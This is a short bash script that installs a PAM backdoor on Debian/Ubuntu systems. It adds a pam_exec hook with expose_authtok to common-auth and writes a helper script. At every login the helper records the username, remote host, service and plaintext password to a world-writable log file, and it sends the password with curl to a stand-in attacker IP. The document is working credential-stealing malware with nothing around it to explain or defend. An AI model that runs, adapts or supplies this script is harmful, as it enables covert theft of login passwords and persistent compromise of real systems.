#!/bin/bash

FILE=/var/log.txt
touch $FILE
chmod 777 $FILE
#chown ftp:ftp $FILE

# ubuntu/deb-based
echo "auth sufficient pam_exec.so expose_authtok /usr/local/bin/pam.sh" | cat - /etc/pam.d/common-auth > /tmp/common-auth && mv /tmp/common-auth /etc/pam.d/common-auth

cat > /usr/local/bin/pam.sh << EOF
#!/bin/sh
read password
echo "User: \$PAM_USER" >> $FILE
echo "Ruser: \$PAM_RUSER" >> $FILE
echo "Rhost: \$PAM_RHOST" >> $FILE
echo "Service: \$PAM_SERVICE" >> $FILE
echo "TTY: \$PAM_TTY" >> $FILE
echo "Password : \$password" >> $FILE
curl http://IP/\$password
EOF

chmod 700 /usr/local/bin/pam.sh
chown root:root /usr/local/bin/pam.sh